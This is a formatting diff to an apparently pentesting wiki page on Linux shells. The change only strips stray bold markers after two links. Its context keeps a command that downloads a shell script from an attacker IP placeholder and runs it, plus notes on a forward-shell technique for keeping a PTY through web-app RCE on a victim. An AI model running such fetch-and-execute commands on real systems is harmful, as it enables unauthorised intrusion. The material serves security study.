@@ -1,6 +1,6 @@
 # Shells - Linux
 
-**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)****
+**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -43,7 +43,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ## Forward Shell
 
 You might find cases where you have a **RCE in a web app in a, Linux machine** but due to Iptables rules or other kind of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
-You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)****
+You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 You just need to modify:
 
